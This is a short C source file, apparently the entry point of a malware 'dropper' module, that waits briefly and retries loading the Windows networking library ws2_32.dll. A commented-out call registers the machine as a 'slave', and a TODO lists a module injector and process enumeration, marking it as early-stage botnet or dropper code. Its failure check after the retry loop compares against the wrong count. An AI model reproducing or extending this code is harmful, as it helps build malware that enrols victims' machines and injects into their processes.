#include <wsasdk.h>
#include <dropper\entry.h>
#include <dropper\register.h>
#include <core\ldr.h>
#include <core\ntapi.h>
#include <core\wsapi.h>

ULONG
WINAPI
DropperEntry(VOID) {
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD1);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    {
        QWORD qwTimeout = -MS_TO_100NS(200);
        ULONG_PTR dwTries = 0;

        for (dwTries = 0; dwTries != 5; dwTries++) {
            if (!NT_SUCCESS(NtDelayExecution(FALSE, (PVOID)&qwTimeout))) {
                $DLOG1(DLG_FLT_CRITICAL, "NtDelayExecution failed!");

                return 0;
            }

            if (LdrLoadWsapi()) {
                break;
            }
        }

        if (dwTries == 4) {
            $DLOG1(DLG_FLT_CRITICAL, "Failed to find ws2_32.dll");

            return 0;
        }
    };

    //if (!RegisterSlave()) {
    //    return 0;
    //}



    /*
    TODO:
        ValidateConfig ??
        Module injector
        Process enum
    */

    return 0;
}